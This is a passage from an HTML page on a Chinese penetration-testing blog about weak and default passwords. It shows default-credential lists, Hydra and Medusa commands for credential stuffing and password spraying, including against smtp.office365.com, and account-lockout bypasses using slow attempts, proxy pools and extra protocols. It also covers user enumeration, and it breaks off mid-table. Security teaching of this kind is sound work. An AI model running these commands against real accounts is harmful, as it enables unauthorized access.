@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="引言认证是信息系统的第一道防线。无论防火墙策略多么严密，一旦攻击者获取了合法凭证，防护便形同虚设。在渗透测试实战中，弱口令与默认口令依然是最可靠、成本最低的初始访问途径之一。本文系统梳理默认凭证数据库、弱口令规律、凭证攻击手法对比、锁定绕过技巧，并结合 Hydra 与 Medusa 给出可复现的示例。 默认凭证数据库面对未知设备时应首先查阅默认凭证数据库，以下是业界常用的公开资源。 Default">
+<meta property="og:type" content="article">
+<meta property="og:title" content="认证安全：弱口令与默认口令">
+<meta property="og:url" content="https://congliang.github.io/Authentication-default-credentials/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="引言认证是信息系统的第一道防线。无论防火墙策略多么严密，一旦攻击者获取了合法凭证，防护便形同虚设。在渗透测试实战中，弱口令与默认口令依然是最可靠、成本最低的初始访问途径之一。本文系统梳理默认凭证数据库、弱口令规律、凭证攻击手法对比、锁定绕过技巧，并结合 Hydra 与 Medusa 给出可复现的示例。 默认凭证数据库面对未知设备时应首先查阅默认凭证数据库，以下是业界常用的公开资源。 Default">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.818Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="认证安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Authentication-default-credentials/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Authentication-default-credentials/","path":"Authentication-default-credentials/","title":"认证安全：弱口令与默认口令"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>认证安全：弱口令与默认口令 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%98%E8%AE%A4%E5%87%AD%E8%AF%81%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.</span> <span class="nav-text">默认凭证数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DefaultCreds-cheat-sheet"><span class="nav-number">2.1.</span> <span class="nav-text">DefaultCreds-cheat-sheet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SecLists-%E9%BB%98%E8%AE%A4%E5%87%AD%E8%AF%81%E7%9B%AE%E5%BD%95"><span class="nav-number">2.2.</span> <span class="nav-text">SecLists 默认凭证目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BF%E6%9F%A5%E8%AF%A2%E5%B9%B3%E5%8F%B0"><span class="nav-number">2.3.</span> <span class="nav-text">在线查询平台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RouterSploit"><span class="nav-number">2.4.</span> <span class="nav-text">RouterSploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%88%E5%B9%B6%E5%8E%BB%E9%87%8D%E7%94%9F%E6%88%90%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AD%97%E5%85%B8"><span class="nav-number">2.5.</span> <span class="nav-text">合并去重生成自定义字典</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Top-1000-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">Top 1000 弱口令分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E7%B1%BB%E7%89%B9%E5%BE%81"><span class="nav-number">3.1.</span> <span class="nav-text">分类特征</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E5%85%B8%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">3.2.</span> <span class="nav-text">字典操作实用命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Credential-Stuffing-vs-Password-Spraying"><span class="nav-number">4.</span> <span class="nav-text">Credential Stuffing vs. Password Spraying</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Credential-Stuffing%EF%BC%88%E5%87%AD%E8%AF%81%E5%A1%AB%E5%85%85%EF%BC%89"><span class="nav-number">4.1.</span> <span class="nav-text">Credential Stuffing（凭证填充）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Password-Spraying%EF%BC%88%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">Password Spraying（密码喷洒）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E6%AF%94%E6%80%BB%E7%BB%93"><span class="nav-number">4.3.</span> <span class="nav-text">对比总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B4%A6%E6%88%B7%E9%94%81%E5%AE%9A%E7%AD%96%E7%95%A5%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">账户锁定策略绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="nav-number">5.1.</span> <span class="nav-text">绕过技术</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%87%AD%E6%8D%AE"><span class="nav-number">6.</span> <span class="nav-text">常见设备默认凭据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8C%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87"><span class="nav-number">6.1.</span> <span class="nav-text">路由器和网络设备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4-CCTV"><span class="nav-number">6.2.</span> <span class="nav-text">网络摄像头 (CCTV)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IoT-%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AE%A1%E7%90%86"><span class="nav-number">6.3.</span> <span class="nav-text">IoT 与服务器管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA%E4%B8%93%E9%A1%B9"><span class="nav-number">6.4.</span> <span class="nav-text">打印机专项</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hydra-%E5%AE%9E%E6%88%98"><span class="nav-number">7.</span> <span class="nav-text">Hydra 实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E5%8D%8F%E8%AE%AE%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.1.</span> <span class="nav-text">基础协议示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95"><span class="nav-number">7.2.</span> <span class="nav-text">高级用法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medusa-%E5%AE%9E%E6%88%98"><span class="nav-number">8.</span> <span class="nav-text">Medusa 实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="nav-number">8.1.</span> <span class="nav-text">基本用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-%E4%B8%8E%E6%89%B9%E9%87%8F"><span class="nav-number">8.2.</span> <span class="nav-text">HTTP 与批量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E9%80%89%E6%8B%A9%E5%BB%BA%E8%AE%AE"><span class="nav-number">8.3.</span> <span class="nav-text">工具选择建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E6%8E%AA%E6%96%BD"><span class="nav-number">9.1.</span> <span class="nav-text">技术措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E4%BE%9B%E5%BA%94%E9%93%BE%E4%B8%8E%E8%B5%84%E4%BA%A7"><span class="nav-number">9.2.</span> <span class="nav-text">针对供应链与资产</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E8%87%AA%E6%9F%A5%E5%91%BD%E4%BB%A4"><span class="nav-number">9.3.</span> <span class="nav-text">防御自查命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">10.</span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%BA%90"><span class="nav-number">11.</span> <span class="nav-text">参考资源</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Authentication-default-credentials/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="认证安全：弱口令与默认口令 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          认证安全：弱口令与默认口令
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-07-01 08:00:00" itemprop="dateCreated datePublished" datetime="2026-07-01T08:00:00+08:00">2026-07-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>认证是信息系统的第一道防线。无论防火墙策略多么严密，一旦攻击者获取了合法凭证，防护便形同虚设。在渗透测试实战中，弱口令与默认口令依然是最可靠、成本最低的初始访问途径之一。本文系统梳理默认凭证数据库、弱口令规律、凭证攻击手法对比、锁定绕过技巧，并结合 Hydra 与 Medusa 给出可复现的示例。</p>
+<h2 id="默认凭证数据库"><a href="#默认凭证数据库" class="headerlink" title="默认凭证数据库"></a>默认凭证数据库</h2><p>面对未知设备时应首先查阅默认凭证数据库，以下是业界常用的公开资源。</p>
+<h3 id="DefaultCreds-cheat-sheet"><a href="#DefaultCreds-cheat-sheet" class="headerlink" title="DefaultCreds-cheat-sheet"></a>DefaultCreds-cheat-sheet</h3><p><a target="_blank" rel="noopener" href="https://github.com/ihebski/DefaultCreds-cheat-sheet">GitHub 仓库</a> 维护数千条 CSV 记录，覆盖路由器、交换机、防火墙、打印机、IPMI、数据库等设备类型，字段包括 <code>vendor</code>、<code>product</code>、<code>protocol</code>、<code>username</code>、<code>password</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vendor,product,protocol,username,password</span><br><span class="line">Cisco,IOS,ssh,admin,admin</span><br><span class="line">Hikvision,DS-2CD2xxx,http,admin,12345</span><br><span class="line">Dell,iDRAC6,http,root,calvin</span><br><span class="line">Oracle,WebLogic,http,weblogic,welcome1</span><br></pre></td></tr></table></figure>
+
+<h3 id="SecLists-默认凭证目录"><a href="#SecLists-默认凭证目录" class="headerlink" title="SecLists 默认凭证目录"></a>SecLists 默认凭证目录</h3><p><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">SecLists</a> 仓库中 <code>Passwords/Default-Credentials/</code> 分类细致，涵盖 <code>avaya_default_passwords.csv</code>、<code>scada-pass.csv</code>、<code>tomcat-betterdefaultpasslist.txt</code> 等子集，适合按行业和设备类型快速定位。</p>
+<h3 id="在线查询平台"><a href="#在线查询平台" class="headerlink" title="在线查询平台"></a>在线查询平台</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://cirt.net/passwords">CIRT.net</a> — 按厂商字母排序查询</li>
+<li><a target="_blank" rel="noopener" href="https://default-password.info/">DefaultPassword.com</a> — 按路由器型号检索</li>
+<li><a target="_blank" rel="noopener" href="https://www.routerpasswords.com/">RouterPasswords.com</a> — 专注家用路由器品牌</li>
+</ul>
+<h3 id="RouterSploit"><a href="#RouterSploit" class="headerlink" title="RouterSploit"></a>RouterSploit</h3><p><a target="_blank" rel="noopener" href="https://github.com/threat9/routersploit">RouterSploit</a> 框架内置路由器漏洞利用模块，<code>routersploit/wordlists/</code> 目录提供按品牌分类的默认凭证，适合自动化路由器渗透。</p>
+<h3 id="合并去重生成自定义字典"><a href="#合并去重生成自定义字典" class="headerlink" title="合并去重生成自定义字典"></a>合并去重生成自定义字典</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> default-passwords.csv avaya_default_passwords.csv \</span><br><span class="line">  | <span class="built_in">cut</span> -d<span class="string">&#x27;,&#x27;</span> -f3,4 | <span class="built_in">sort</span> -u &gt; merged-defaults.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Top-1000-弱口令分析"><a href="#Top-1000-弱口令分析" class="headerlink" title="Top 1000 弱口令分析"></a>Top 1000 弱口令分析</h2><p>以 Kali 自带的 <code>rockyou.txt</code>（约 1400 万条）为例，其前 1000 条揭示如下规律：</p>
+<h3 id="分类特征"><a href="#分类特征" class="headerlink" title="分类特征"></a>分类特征</h3><p><strong>数字序列型：</strong> <code>123456</code>、<code>123456789</code>、<code>12345</code>、<code>111111</code>、<code>000000</code>、<code>666666</code></p>
+<p><strong>键盘模式型：</strong> <code>qwerty</code>、<code>qwerty123</code>、<code>asdfgh</code>、<code>zxcvbnm</code>、<code>1q2w3e4r</code></p>
+<p><strong>简单语义型：</strong> <code>password</code>、<code>iloveyou</code>、<code>princess</code>、<code>monkey</code>、<code>dragon</code>、<code>shadow</code></p>
+<p><strong>中文用户常见弱口令：</strong> <code>admin123</code>、<code>admin888</code>、<code>12345678</code>、<code>88888888</code>、<code>woaini</code>、<code>woaiwojia</code>、<code>5201314</code></p>
+<h3 id="字典操作实用命令"><a href="#字典操作实用命令" class="headerlink" title="字典操作实用命令"></a>字典操作实用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">head</span> -n 1000 /usr/share/wordlists/rockyou.txt &gt; top1000.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按长度过滤并去重</span></span><br><span class="line">awk <span class="string">&#x27;length($0) &gt;= 6 &amp;&amp; length($0) &lt;= 16&#x27;</span> rockyou.txt \</span><br><span class="line">  | <span class="built_in">sort</span> -u &gt; rockyou-6to16.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># hashcat-utils 组合生成</span></span><br><span class="line">combinator top1000.txt top1000.txt &gt; combo-1M.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Credential-Stuffing-vs-Password-Spraying"><a href="#Credential-Stuffing-vs-Password-Spraying" class="headerlink" title="Credential Stuffing vs. Password Spraying"></a>Credential Stuffing vs. Password Spraying</h2><p>两种攻击常被混淆，但其逻辑与适用场景截然不同。</p>
+<h3 id="Credential-Stuffing（凭证填充）"><a href="#Credential-Stuffing（凭证填充）" class="headerlink" title="Credential Stuffing（凭证填充）"></a>Credential Stuffing（凭证填充）</h3><p>依赖用户跨站复用密码的习性，将已泄露的凭证对（<code>user:password</code>）直接向目标系统尝试。</p>
+<ul>
+<li>一个用户名对应一个或极少数密码</li>
+<li>高命中率依赖泄露数据质量</li>
+<li>登录失败在用户名维度分散，触发锁定概率较低</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hydra 凭证填充</span></span><br><span class="line">hydra -C leaked_creds.txt ssh://192.168.1.100</span><br><span class="line"><span class="comment"># leaked_creds.txt 格式: username:password</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Spraying（密码喷洒）"><a href="#Password-Spraying（密码喷洒）" class="headerlink" title="Password Spraying（密码喷洒）"></a>Password Spraying（密码喷洒）</h3><p>假设大量用户中存在少数弱口令个体，用少量密码对全体用户各试一次。</p>
+<ul>
+<li>一个密码对应大量用户名</li>
+<li>每用户仅尝试一次，有效规避锁定策略</li>
+<li>依靠广度覆盖而非深度爆破</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hydra 密码喷洒</span></span><br><span class="line">hydra -L users.txt -p <span class="string">&#x27;Spring2026!&#x27;</span> smtp.office365.com smtp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多密码依次喷洒，间隔 5 分钟以降低检测风险</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> -r pass; <span class="keyword">do</span></span><br><span class="line">  hydra -L users.txt -p <span class="string">&quot;<span class="variable">$pass</span>&quot;</span> smtp.office365.com smtp</span><br><span class="line">  <span class="built_in">sleep</span> 300</span><br><span class="line"><span class="keyword">done</span> &lt; top_passwords.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="对比总结"><a href="#对比总结" class="headerlink" title="对比总结"></a>对比总结</h3><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Credential Stuffing</th>
+<th>Password Spraying</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输入</td>
+<td>泄露凭据对</td>
+<td>用户名列表 + 少量密码</td>
+</tr>
+<tr>
+<td>每用户尝试次数</td>
+<td>极少</td>
+<td>极少</td>
+</tr>
+<tr>
+<td>触发锁定风险</td>
+<td>低</td>
+<td>极低</td>
+</tr>
+<tr>
+<td>成功率依赖</td>
+<td>密码复用率</td>
+<td>弱口令普遍性</td>
+</tr>
+<tr>
+<td>典型目标</td>
+<td>B2C 服务</td>
+<td>企业 AD&#x2F;Azure AD&#x2F;O365</td>
+</tr>
+</tbody></table>
+<h2 id="账户锁定策略绕过"><a href="#账户锁定策略绕过" class="headerlink" title="账户锁定策略绕过"></a>账户锁定策略绕过</h2><p>锁定策略（连续 N 次失败后锁定 M 分钟）是常见的爆破防御手段，但存在多种绕过途径。</p>
+<h3 id="绕过技术"><a href="#绕过技术" class="headerlink" title="绕过技术"></a>绕过技术</h3><p><strong>1. 低速爆破：</strong> 将尝试间隔拉长到超过锁定窗口长度。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 \</span><br><span class="line">  -t 1 -W 30 -c 60</span><br><span class="line"><span class="comment"># -t 1: 单任务  -W 30: 间隔30秒  -c 60: 每分钟全局连接上限</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 分布式来源 IP：</strong> 通过代理池分散源 IP，使每个 IP 的尝试次数低于阈值。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.1.100 -u admin -P top1000.txt \</span><br><span class="line">  -M ssh -t 10 -O proxy_list.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 利用不同协议端点：</strong> 同一认证后端暴露在多个协议上——Web 端可能锁定但 IMAP&#x2F;SMTP 未锁，主站有验证码但 API 端点没有。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多协议并行尝试，共享同一字典</span></span><br><span class="line">medusa -h mail.target.com -U users.txt -P passwords.txt -M imap &amp;</span><br><span class="line">medusa -h mail.target.com -U users.txt -P passwords.txt -M smtp-vrfy &amp;</span><br><span class="line">medusa -h mail.target.com -U users.txt -P passwords.txt -M pop3 &amp;</span><br><span class="line"><span class="built_in">wait</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 先枚举用户名再审慎爆破：</strong> 利用 Kerberos、SMTP VRFY、O365 时间侧信道等方式获取有效用户列表。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum -d target.local --dc 10.0.0.1 user_list.txt</span><br><span class="line">smtp-user-enum -M VRFY -U names.txt -t mail.target.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="常见设备默认凭据"><a href="#常见设备默认凭据" class="headerlink" title="常见设备默认凭据"></a>常见设备默认凭据</h2><h3 id="路由器和网络设备"><a href="#路由器和网络设备" class="headerlink" title="路由器和网络设备"></a>路由器和网络设备</h3><table>
+<thead>
+<tr>
+<th>厂商</th>
+<th>默认用户名</th>
+<th>默认密码</th>
+<th>管理协议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TP-Link</td>
+<td>admin</td>
+<td>admin</td>
+<td>HTTP</td>
+</tr>
+<tr>
+<td>Cisco</td>
+<td>admin &#x2F; cisco</td>
+<td>admin &#x2F; cisco</td>
